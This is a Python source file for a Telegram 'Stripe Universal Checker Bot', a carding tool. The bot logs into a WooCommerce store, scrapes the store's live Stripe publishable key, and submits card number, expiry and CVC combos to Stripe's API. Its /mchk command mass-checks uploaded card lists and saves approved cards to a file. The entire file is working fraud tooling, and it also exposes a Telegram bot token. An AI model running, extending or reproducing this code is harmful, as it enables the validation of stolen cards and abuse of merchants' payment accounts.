import logging
import re
import requests
import json
import asyncio
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes

# Logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# In-memory site login storage
site_logins = {}

# Parse card combo
def parse_card(combo: str):
    parts = combo.strip().replace('/', '|').split('|')
    if len(parts) < 4:
        return None
    return {
        'number': parts[0],
        'exp_month': parts[1],
        'exp_year': parts[2],
        'cvc': parts[3]
    }

# Detect Stripe setup (pk + method)
def detect_stripe_setup(site: str, session: requests.Session):
    try:
        r = session.get(site, timeout=10)
        pk = re.search(r'pk_live_[\w]+', r.text)
        if not pk:
            return None

        pk = pk.group(0)

        if 'payment_method' in r.text:
            method = 'payment_method'
        elif 'token' in r.text:
            method = 'token'
        elif 'source' in r.text:
            method = 'source'
        elif 'setup_intent' in r.text:
            method = 'setup_intent'
        else:
            method = 'unknown'

        return {'pk': pk, 'method': method}
    except Exception as e:
        return None

# Site login
def site_login(site, email, password):
    session = requests.Session()
    try:
        login_url = f'{site}/my-account/'
        r = session.get(login_url, timeout=10)
        nonce = re.search(r'name="woocommerce-login-nonce" value="(.+?)"', r.text)
        referer = re.search(r'name="_wp_http_referer" value="(.+?)"', r.text)

        if not nonce or not referer:
            return None, "Failed to extract login form"

        payload = {
            'username': email,
            'password': password,
            'woocommerce-login-nonce': nonce.group(1),
            '_wp_http_referer': referer.group(1),
            'login': 'Log in'
        }
        res = session.post(login_url, data=payload, timeout=10)
        if 'customer-logout' not in res.text:
            return None, "Login failed"

        return session, "success"
    except Exception as e:
        return None, f"Login error: {str(e)}"

# Process one card
def check_card(session, stripe_data, site, method, pk):
    try:
        if method == 'payment_method':
            stripe_data.update({'type': 'card', 'key': pk})
            r = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_data)
        elif method == 'token':
            stripe_data.update({'card[number]': stripe_data['number'], 'card[exp_month]': stripe_data['exp_month'], 'card[exp_year]': stripe_data['exp_year'], 'card[cvc]': stripe_data['cvc'], 'key': pk})
            r = session.post("https://api.stripe.com/v1/tokens", data=stripe_data)
        elif method == 'source':
            stripe_data.update({'type': 'card', 'card[number]': stripe_data['number'], 'card[exp_month]': stripe_data['exp_month'], 'card[exp_year]': stripe_data['exp_year'], 'card[cvc]': stripe_data['cvc'], 'key': pk})
            r = session.post("https://api.stripe.com/v1/sources", data=stripe_data)
        elif method == 'setup_intent':
            stripe_data.update({'type': 'card', 'key': pk})
            r = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_data)
        else:
            return "Unknown method", False

        result = r.json()
        if 'error' in result:
            return f"Declined ❌ - {result['error'].get('message')}", False
        else:
            return "Approved ✅", True
    except Exception as e:
        return f"Error ❗ - {str(e)}", False

# Telegram command: /addsitelogin
async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        args = update.message.text.split(' ', 1)[1]
        site, email, password = args.split('|')

        session, login_status = site_login(site, email, password)
        if login_status != "success":
            await update.message.reply_text(f"Login failed: {login_status}")
            return

        setup = detect_stripe_setup(site, session)
        if not setup:
            await update.message.reply_text("Could not auto-detect Stripe setup.")
            return

        site_logins[update.effective_user.id] = {
            'site': site,
            'email': email,
            'password': password,
            'pk': setup['pk'],
            'method': setup['method']
        }

        await update.message.reply_text(f"𝐒𝐢𝐭𝐞 𝐥𝐨𝐠𝐢𝐧 𝐜𝐫𝐞𝐝𝐞𝐧𝐭𝐢𝐚𝐥𝐬 𝐟𝐨𝐫 {site} 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐚𝐯𝐞𝐝 ✅\nDetected method: {setup['method']}")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

# Telegram command: /chk
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in site_logins:
        await update.message.reply_text("Use /addsitelogin first.")
        return

    args = update.message.text.split(' ', 1)[1]
    card_data = parse_card(args)
    if not card_data:
        await update.message.reply_text("Invalid card format. Use cc|mm|yy|cvv")
        return

    login = site_logins[update.effective_user.id]
    session, login_status = site_login(login['site'], login['email'], login['password'])
    if login_status != "success":
        await update.message.reply_text(f"Login error: {login_status}")
        return

    result, success = check_card(session, card_data, login['site'], login['method'], login['pk'])
    await update.message.reply_text(f"𝐂𝐡𝐞𝐜𝐤 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝: {result}")

# Telegram command: /mchk
async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in site_logins:
        await update.message.reply_text("Use /addsitelogin first.")
        return

    file = update.message.document
    if not file:
        await update.message.reply_text("Send a .txt file with card combos.")
        return

    file_path = await file.get_file()
    content = await file_path.download_as_bytes()
    combos = content.decode().splitlines()

    msg = await update.message.reply_text("Starting mass check...")
    stats = {'approved': 0, 'declined': 0, 'errors': 0, 'total': 0}
    approved_lines = []

    login = site_logins[update.effective_user.id]
    session, login_status = site_login(login['site'], login['email'], login['password'])
    if login_status != "success":
        await msg.edit_text(f"Login error: {login_status}")
        return

    for line in combos:
        card_data = parse_card(line)
        stats['total'] += 1

        if not card_data:
            stats['errors'] += 1
            continue

        result, success = check_card(session, card_data, login['site'], login['method'], login['pk'])
        if success:
            stats['approved'] += 1
            approved_lines.append(line)
        else:
            stats['declined'] += 1

        await msg.edit_text(
            f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n"
            f"Approved ✅: {stats['approved']}\n"
            f"Declined ❌: {stats['declined']}\n"
            f"Errors ⚠️: {stats['errors']}\n"
            f"Total Checked: {stats['total']}"
        )
        await asyncio.sleep(1)

    with open("approved.txt", "w") as f:
        f.write("\n".join(approved_lines))

    await msg.edit_text(
        f"✅ Mass check complete.\n"
        f"Approved: {stats['approved']}\n"
        f"Declined: {stats['declined']}\n"
        f"Errors: {stats['errors']}\n"
        f"Saved to approved.txt"
    )

# Start bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome to Stripe Universal Checker Bot. Use /addsitelogin to begin.")

# Run
def main():
    import os
    TOKEN = os.getenv("7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs")  # Set in Render or local .env

    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("mchk", mchk))
    app.add_handler(MessageHandler(filters.Document.MIME_TYPE("text/plain"), mchk))

    app.run_polling()

if __name__ == "__main__":
    main()
